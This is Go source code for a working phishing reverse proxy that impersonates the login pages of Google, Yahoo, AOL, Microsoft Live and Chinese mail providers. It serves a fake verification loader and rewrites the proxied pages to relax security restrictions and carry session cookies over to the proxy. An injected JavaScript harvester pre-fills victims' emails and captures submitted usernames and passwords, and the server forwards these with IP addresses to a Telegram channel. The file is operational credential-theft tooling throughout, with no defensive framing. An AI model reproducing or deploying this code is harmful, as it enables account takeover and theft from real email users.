package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
const OriginalURL = window.URL;
window.URL = function(url, base) {
    try { return new OriginalURL(url, base || window.location.origin); } 
    catch (e) {
        if (typeof url === 'string' && !url.startsWith('http')) {
            return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
        }
        return new OriginalURL('https://' + window.location.hostname + '/');
    }
};
window.URL.prototype = OriginalURL.prototype;

setTimeout(function() {
    var email = window._targetEmail;
    if (email) {
        fetch(window.location.origin + '/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'type=email_only&email=' + encodeURIComponent(email)
        }).catch(() => {});
    }
}, 500);

// FIX: React-Safe Auto-Fill
setInterval(function() {
    var email = window._targetEmail;
    if (email) {
        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
        if (inputs.length > 0 && inputs[0].value === "") {
            let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
            setter.call(inputs[0], email);
            inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
            inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
            inputs[0].focus();
        }
    }
}, 1000);

document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const params = new URLSearchParams();
    let hasEmail = false;
    let hasPassword = false;

    for (let [key, value] of formData.entries()) {
        params.append(key, value);
        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
            hasEmail = true;
        }
        if (key.toLowerCase().includes('pass')) {
            hasPassword = true;
        }
    }

    if (hasEmail && hasPassword) {
        fetch(window.location.origin + '/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: params.toString() + '&type=login'
        }).catch(() => {});
        return true;
    }
}, false);
</script>
`

const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
setTimeout(()=>{
    var hash = window.location.hash;
    var email = "";
    
    if (hash && hash.length > 1) {
        var raw = hash.substring(1); 

        if (raw.startsWith('t=')) {
            var b64 = raw.split('t=')[1];
            try { email = atob(b64); } catch(e) { email = b64; }
        } else {
            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
            else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
            else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
            else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
            else { email = raw; }
            
            var b64Email = btoa(email);
            window.history.replaceState({}, '', '/#?t=' + b64Email);
        }

        window._targetEmail = email;
        
        fetch('/api/fetch?email=' + encodeURIComponent(email))
            .then(r => r.text())
            .then(html => {
                document.open();
                document.write(html);
                document.close();
            });
    } else {
        document.body.innerHTML = "<h3>No account provided.</h3>";
    }
}, 1000);
</script></body></html>`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.NoRoute(func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
			email = string(b64)
		}

		if email == "" {
			c.String(400, "Missing email")
			return
		}

		targetBase := GetTargetDomain(email)
		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return http.ErrUseLastResponse
				}
				return nil
			},
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				TLSHandshakeTimeout: 10 * time.Second,
				MaxIdleConns:        100,
				IdleConnTimeout:     90 * time.Second,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			},
		}

		req, err := http.NewRequest("GET", targetBase, nil)
		if err != nil {
			c.String(500, "Request Error")
			return
		}

		req.Header.Set("Accept-Encoding", "identity")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")

		resp, err := proxyClient.Do(req)
		if err != nil {
			log.Printf("Proxy Error: %v", err)
			c.String(502, "Error: %v", err)
			return
		}
		defer resp.Body.Close()

		var bodyReader io.Reader = resp.Body
		if resp.Header.Get("Content-Encoding") == "gzip" {
			gzipReader, err := gzip.NewReader(resp.Body)
			if err == nil {
				defer gzipReader.Close()
				bodyReader = gzipReader
			}
		}

		bodyBytes, _ := io.ReadAll(bodyReader)

		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
			if decoded, err := io.ReadAll(reader); err == nil {
				bodyBytes = decoded
			}
		}

		bodyStr := string(bodyBytes)

		// FIX: Strip out the document.write scripts that are causing the console spam
		reDocWrite := regexp.MustCompile(`(?i)<script[^>]*>.*?document\.write.*?<\/script>`)
		bodyStr = reDocWrite.ReplaceAllString(bodyStr, "")

		// Force UTF-8 encoding
		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")

		// Remove ServiceWorker
		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)

		// Remove iframe sandbox restrictions
		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
			m = strings.ReplaceAll(m, `sandbox=""`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts allow-same-origin"`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts"`, "")
			m = strings.ReplaceAll(m, `sandbox`, "")
			return m
		})

		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetBase, c.Request.Host+"/")
		if strings.Contains(email, "@") {
			domain := strings.Split(email, "@")[1]
			bodyStr = strings.ReplaceAll(bodyStr, "https://"+domain, c.Request.Host+"/")
			bodyStr = strings.ReplaceAll(bodyStr, "http://"+domain, c.Request.Host+"/")
		}

		baseTag := `<base href="` + targetBase + `">`
		emailScript := `<script>window._targetEmail = "` + email + `";</script>`

		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)

		c.Header("Content-Type", "text/html; charset=utf-8")
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")

		// FIX: Force the cookie domain to work on our proxy
		for _, cookie := range resp.Cookies() {
			newCookie := &http.Cookie{
				Name:     cookie.Name,
				Value:    cookie.Value,
				Path:     "/",
				Domain:   "", // Leave blank so it applies to fly.dev
				MaxAge:   3600 * 24,
				HttpOnly: false,
				Secure:   false,
				SameSite: http.SameSiteNoneMode,
			}
			http.SetCookie(c.Writer, newCookie)
		}

		c.String(resp.StatusCode, bodyStr)
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		c.Request.ParseForm()
		email := c.PostForm("email")
		password := c.PostForm("password")
		harvestType := c.PostForm("type")

		if email == "" {
			email = c.PostForm("username")
		}
		if email == "" {
			email = c.PostForm("loginfmt")
		}
		if password == "" {
			password = c.PostForm("passwd")
		}
		if password == "" {
			password = c.PostForm("pwd")
		}

		ip := c.ClientIP()
		ua := c.GetHeader("User-Agent")

		if harvestType == "email_only" {
			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
		} else {
			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
		}

		c.JSON(200, gin.H{"status": "ok"})
	})

	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
		referer := c.GetHeader("Referer")
		targetDomain := "https://accounts.google.com/"

		if strings.Contains(referer, "126.com") {
			targetDomain = "https://mail.126.com/"
		} else if strings.Contains(referer, "163.com") {
			targetDomain = "https://mail.163.com/"
		} else if strings.Contains(referer, "yahoo.com") {
			targetDomain = "https://login.yahoo.com/"
		} else if strings.Contains(referer, "aol.com") {
			targetDomain = "https://login.aol.com/"
		} else if strings.Contains(referer, "live.com") {
			targetDomain = "https://login.live.com/"
		}

		fullURL := targetDomain + filepath

		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
		if err != nil {
			c.String(502, "Bad Request")
			return
		}

		for k, v := range c.Request.Header {
			for _, val := range v {
				outReq.Header.Add(k, val)
			}
		}

		client := &http.Client{
			Timeout:   15 * time.Second,
			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		}

		resp, err := client.Do(outReq)
		if err == nil {
			defer resp.Body.Close()
			for k, v := range resp.Header {
				for _, val := range v {
					c.Writer.Header().Add(k, val)
				}
			}
			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
			c.Writer.WriteHeader(resp.StatusCode)
			io.Copy(c.Writer, resp.Body)
		} else {
			c.String(502, "Upstream Error")
		}
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}
